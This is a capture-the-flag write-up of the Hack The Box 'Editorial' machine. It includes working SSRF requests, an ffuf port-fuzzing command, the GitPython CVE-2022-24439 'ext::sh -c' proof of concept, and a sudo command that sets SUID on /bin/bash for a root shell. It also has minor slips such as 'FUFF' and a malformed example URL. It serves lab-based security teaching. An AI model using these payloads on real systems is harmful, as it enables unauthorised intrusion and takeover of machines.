# SSRF attack and Fuzzing example (HTB "Editorial" retrospective)

This is a great example of an HTB machine vulnerable to an SSRF attack. To exploit it, I had to use fuzzing with ```ffuf```, which helped me identify an internal open port and exposed some interesting API endpoints. These eventually revealed clear-text credentials, which I used to SSH into the machine and establish the initial foothold. From there, I escalated privileges by exploiting a vulnerability in GitPython, ultimately gaining root access.

Initial enumeration revealed two open ports: 22 and 80. When visiting the web server on port 80, I was redirected to ```http://editorial.htb```, so I added this to my ```/etc/hosts``` file using the following command:

```
echo "10.10.11.20 editorial.htb" | tee -a /etc/hosts
```

Exploring the web application revealed a basic static webpage. I noticed a "Publish with us" link that redirected to ```/upload```. This page featured several input forms, but the most significant was the "book information" field, which allowed us to upload a book cover from a URL—an intriguing capability. This was the only field I needed to exploit for establishing the initial foothold, along with the "preview" button to trigger (and capture) the initial request.

To confirm the SSRF vulnerability, I started an ncat listener and entered my IP and port into the captured request in Burp. Upon sending the request, the listener detected incoming traffic, validating the vulnerability.

For more information about SSRF attacks, here is the [following link](https://portswigger.net/web-security/ssrf).

## Initial Foothold Strategy

During the SSRF attack, the first approach involved attempting to read internal files, but this method proved unsuccessful. With that avenue closed, the focus shifted to exploiting API endpoints. In the process of enumerating internal ports and services, the primary goal was to identify accessible API endpoints that could be exploited for gathering cleartext credentials. 

To do this, we fuzzed the URL ```http://editorial.htb/upload-cover``` using the payload ```http://127.0.0.1:FUZZ```. This involved incrementally increasing the port number and capturing each response's length (using the ```FUFF``` tool - more on that later). By analyzing the response sizes, we could determine which ports were open and actively serving requests.

This approach worked well for several reasons:

- Direct Feedback: By monitoring the response lengths, we gained immediate feedback on which ports were responsive. A difference in response size often indicated that the server was processing requests, leading us to discover active services.

- API Interaction: Many web applications expose internal services through APIs. By targeting common internal ports (like those used for web services), we increased our chances of hitting a service that could provide useful information or credentials.

- Limited Surface Area: Fuzzing specific endpoints with a targeted payload allowed us to narrow down our exploration to relevant responses. This focused approach is more efficient than broad scans and helps in quickly identifying actionable data.

- Credential Exposure: Once we identified an open port, further exploration of its API responses could lead us to sensitive information, such as cleartext credentials, which are often overlooked in secure environments.

In short, this method of port fuzzing and response analysis was a systematic way to explore and exploit internal services, enabling us to gather the credentials needed for the next phase of the attack.

## More on API Endpoints

API (Application Programming Interface) endpoints are specific URLs that allow applications to communicate with each other. They serve as gateways for different functionalities of a web application, allowing for data exchange and interactions. API endpoints can return data in various formats, such as JSON or XML, and typically correspond to specific actions or resources.

**How API Endpoints Work**

1. Request/Response Model: APIs follow a request-response cycle where a client sends a request to an endpoint and receives a response from the server. The request usually specifies the method (GET, POST, PUT, DELETE, etc.) and may include parameters or payloads.

2. Resource Identification: Each endpoint corresponds to a specific resource or set of resources. For example, an endpoint like ```/api/users``` might handle operations related to user data.

3. Data Format: APIs often use standardized data formats like JSON or XML for data exchange, making it easier for different systems to interact.

When interacting with potential endpoints, pay attention to response headers and bodies. APIs often return structured data, which can be indicative of their functionality. Look for any endpoints that return status codes like 200 (OK) or 404 (Not Found) when you manipulate parameters. Some APIs may provide error messages that disclose endpoint information when incorrect parameters are sent. This can give clues about the expected structure or functionality of the API.

Also, it's a good idea to start by exploring the web application manually. Look for common API paths like ```/api/```, ```/v1/```, ```/data/```, or ```/services/```. Tools like ```dirb```, ```gobuster```, or ```ffuf``` can be used to fuzz directories for known API patterns. You can use wordlists that include common API paths to discover hidden endpoints.

## The task at hand (using FUFF)

In this specific scenario, we aim to fuzz a request captured from Burp Suite. To accomplish this, we can save the request to a file and modify the target area using the ```FUZZ``` keyword. We can then load this file into the ```ffuf``` command line with the ```-request``` parameter. This approach is particularly useful when dealing with multiple parameters.

After some trial and error, I successfully crafted a command that looks like this:

```
ffuf -ac -w /your-word-list/wordlist.txt -u http//target.url -request request.txt -t 10
```

Notes:

- ```-ac``` (Auto Calibration): This flag enables auto calibration, allowing ffuf to automatically adjust its request timing based on the server's response times. This helps optimize performance and reduces the risk of overwhelming the target server, which can lead to connection issues or rate limiting.

- ```-t 10``` (Threads): The ```-t``` flag specifies the number of concurrent threads to use for sending requests. Setting it to 10 means ```ffuf``` will send up to ten requests simultaneously. This can significantly speed up the fuzzing process, but it’s essential to find a balance to avoid overwhelming the server.

But first, here are the contents of the modified captured request (request.txt) that I passed to ```FUFF```:

```
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------283338384034137401052693891016
Content-Length: 363
Origin: http://editorial.htb
Connection: close
Referer: http://editorial.htb/upload

-----------------------------283338384034137401052693891016
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ
-----------------------------283338384034137401052693891016
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream

-----------------------------283338384034137401052693891016--
```

And here is the exact command I used:

```
ffuf -ac -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt:FUZZ -u http://editorial.htb/upload-cover -request request.txt -t 10
```

It's important to note that the URL must be specified manually. Initially, I assumed that using the ```-request``` flag alone would allow ffuf to automatically extract the URL from the request file. In other words, the request file is utilized to modify the body or headers of the request, but it does not automatically set the destination URL unless explicitly provided. While this might seem a bit strange, I’ve gained valuable insights from this experience.

Here is the output from my Kali machine, demonstrating how everything should appear if everything goes smoothly:

```
 :: Method           : POST
 :: URL              : http://editorial.htb/upload-cover
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt
 :: Header           : Host: editorial.htb
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Connection: close
 :: Header           : Content-Type: multipart/form-data; boundary=---------------------------283338384034137401052693891016
 :: Header           : Origin: http://editorial.htb
 :: Header           : Referer: http://editorial.htb/upload
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
 :: Header           : Accept: */*
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Data             : -----------------------------283338384034137401052693891016
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ
-----------------------------283338384034137401052693891016
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream

-----------------------------283338384034137401052693891016--
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 10
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

5000                    [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 124ms]
:: Progress: [10000/10000] :: Job [1/1] :: 47 req/sec :: Duration: [0:04:05] :: Errors: 2 ::
```

The key detail here is the number 5000, which indicates an API endpoint on the internal port 5000.

Entering ```http://127.0.0.1:5000``` in the "Book information" field (found under the "Publish with Us" page) produced an intriguing response in Burp Suite's Proxy - HTTP history (sorting the entries by "Time Requested" can help streamline navigation for easier analysis):

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 23 Sep 2024 15:04:21 GMT
Content-Type: application/octet-stream
Content-Length: 911
Connection: close
Content-Disposition: inline; filename=824a4974-c2b4-4ac0-b97f-bfaaa9ff8ed2
Last-Modified: Mon, 23 Sep 2024 15:04:20 GMT
Cache-Control: no-cache
ETag: "1727103860.8637035-911-4114749752"

{"messages":[{"promotions":{"description":"Retrieve a list
of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}
```

As seen in the output above, upon accessing port 5000, I discovered several API endpoints, with the most intriguing one being ```/api/latest/metadata/messages/authors```.

My next step involved returning to the initial ```http://127.0.0.1:5000``` request, sending it to the Repeater, and appending ```/api/latest/metadata/messages/authors``` as follows:

```
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------3973126007865768581930037291
Content-Length: 395
Origin: http://editorial.htb
Connection: close
Referer: http://editorial.htb/upload

-----------------------------3973126007865768581930037291
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:5000/api/latest/metadata/messages/authors

-----------------------------3973126007865768581930037291
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream

-----------------------------3973126007865768581930037291--
```

After doing so I got the following response:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 23 Sep 2024 15:18:40 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 51

static/uploads/0ad00ea7-6634-455f-8d15-942e15a2160f
```

Clearly, the returned parameter ```static/uploads/0ad00ea7-6634-455f-8d15-942e15a2160f``` warranted further inspection. The simplest approach was to revisit the HTTP history in Burp, locate the relevant response, right-click on it, and copy the entire URL. For instance:

```
http://editorial.htb/static/uploads/0ad00ea7-6634-455f-8d15-942e15a2160f
```

Upon pasting this URL into my browser, it prompted the download of a template file, which revealed some cleartext credentials upon closer inspection.

## Privilege Escalation

With the newly acquired credentials, I was able to SSH into the machine as the "dev" user and retrieve the user flag.

```
ssh dev@editorial.htb
```

Afterward, I started some light enumeration by browsing through directories. One key point of interest was the ".git" directory, which contained various git logs.

```
dev@editorial:~$ cd apps
dev@editorial:~/apps$ ls -la
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5 14:36 .
drwxr-x--- 4 dev dev 4096 Jun  5 14:36 ..
drwxr-xr-x 8 dev dev 4096 Jun  5 14:36 .git
```
Digging a bit deeper:

```
dev@editorial:~/apps/.git$ cd logs
dev@editorial:~/apps/.git/logs$ ls
HEAD  refs
dev@editorial:~/apps/.git/logs$ cat HEAD

(output omitted)
```

To examine the commits, I used the ```git show {commit-id}``` command to explore the changes.

```
dev@editorial:~/apps/.git/logs$ git show 1e84a036b2f33c59e2390730699a488c65643d28 b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae

(output omitted)
```

Inspecting the commit revealed another set of credentials in plain text, this time for the user "prod."

Switching to this user and running the usual ```sudo -l``` command showed that this user is permitted to run a Python script with sudo privileges.

```
User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

Here is how this script looks like:

```
prod@editorial:/opt/internal_apps/clone_changes$ cat clone_prod_change.py 
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

This Python script clones a Git repository from a URL passed as a command-line argument into the ```/opt/internal_apps/clone_changes``` directory.

```os.chdir('/opt/internal_apps/clone_changes')``` changes the working directory to where the repository will be cloned.

```sys.argv[1]``` accepts the URL for the repository as the first argument passed to the script.

```Repo.init('', bare=True)``` initializes a bare Git repository in the current directory, which is typically used to track changes without a working directory.

```r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])``` clones the repository from the provided URL into a folder named new_changes. The option ```-c protocol.ext.allow=always``` allows Git to use certain external protocols.

Researching potential vectors for privilege escalation in this context revealed an interesting vulnerability (CVE-2022-24439) in GitPython. This vulnerability ultimately led to a [proof of concept](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858), which served as the stepping stone for the final exploitation. I'll share it here.

```
from git import Repo
r = Repo.init('', bare=True)
r.clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.ext.allow=always"])
```

This proof of concept exploits a vulnerability in GitPython by using a malicious payload within the ```clone_from``` function to execute arbitrary commands:

- ```Repo.init('', bare=True)```: Initializes an empty Git repository in the current directory.

- ```r.clone_from('ext::sh -c touch% /tmp/pwned'```, ```'tmp', multi_options=["-c protocol.ext.allow=always"])```: Instead of cloning a legitimate URL, it abuses the ```ext::``` protocol to run shell commands (```sh -c touch% /tmp/pwned```). This command creates a file named "pwned" in the ```/tmp``` directory.

- In Git, the ```ext::``` protocol is a feature that allows users to run external commands during certain Git operations, like cloning repositories. Essentially, when you prefix a Git command with ```ext::```, it tells Git to execute the specified shell command instead of performing the usual network-based repository cloning. In the context of the GitPython vulnerability (like in this PoC), ```ext::``` can be abused to execute arbitrary shell commands on the target system, bypassing the normal constraints of the Git operation. This is why it's a key element in exploiting the vulnerability for privilege escalation or remote code execution.

In light of all this, here is my next step which is critical because it turns a normal user into a root user, enabling full control of the system:

```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% u+s% /bin/bash'
```

Here's a breakdown of this command:

- ```sudo /usr/bin/python3```: we're running Python as the ```prod``` user with elevated privileges using ```sudo```.

- ```chmod u+s /bin/bash```: This command sets the SUID bit on ```/bin/bash```. The SUID bit allows users to execute a file with the file owner’s (in this case, root's) privileges. By adding ```u+s```, we're giving root privileges to the ```/bin/bash``` binary, meaning any user who runs ```bash``` will now have root-level access.

- ```%``` characters: The ```%``` signs are used to replace spaces in the shell command. Git interprets spaces in this context as argument delimiters, so by using ```%```, we ensure that the entire command gets passed correctly to ```sh```. Once Git executes the command, it replaces ```%``` with spaces, making the full command look like: ```chmod u+s /bin/bash```.

The following command will confirm whether the SUID bit has been successfully set:

```
prod@editorial:/opt/internal_apps/clone_changes$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

The important part to look for is the ```s``` in ```-rwsr-xr-x```, which indicates that the SUID bit has been set, meaning that running ```/bin/bash``` will execute it with root privileges.

At this point, we should be able to open a root shell by simply running:

```
prod@editorial:/opt/internal_apps/clone_changes$ /bin/bash -p
bash-5.1# id
uid=1000(prod) gid=1000(prod) euid=0(root) groups=1000(prod)
```

The ```-p``` flag in ```/bin/bash -p``` is used to preserve the effective user ID (euid) and effective group ID (egid) when launching a new shell. Normally, when you run a setuid program like ```/bin/bash``` (with SUID set), it will try to drop any elevated privileges and run as the real user. The ```-p``` flag prevents this behavior, ensuring that the shell retains the elevated root privileges granted by the SUID bit.

In this case, when we set the SUID bit on ```/bin/bash``` and then run it with ```-p```, the shell opens with root privileges instead of reverting to the regular user's permissions.

This example is now concluded.
